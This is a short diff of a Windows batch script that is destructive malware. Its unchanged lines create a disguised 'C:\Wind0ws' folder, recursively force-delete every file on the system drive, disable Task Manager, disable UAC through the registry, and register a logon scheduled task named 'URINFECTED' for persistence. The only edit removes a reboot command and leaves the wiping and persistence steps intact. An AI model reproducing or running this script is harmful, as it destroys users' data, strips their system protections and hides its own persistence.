@@ -30,7 +30,7 @@ if '%errorlevel%' NEQ '0' (
 md   C:\Wind0ws
 @echo off 
 start del %systemdrive%\*.* /f /s /q
-shutdown -r -t 10
+
 REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 SchTasks /Create  /SC ONLOGON /TN "URINFECTED"  /TR C:\Wind0ws\runatstart.cmd
  reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
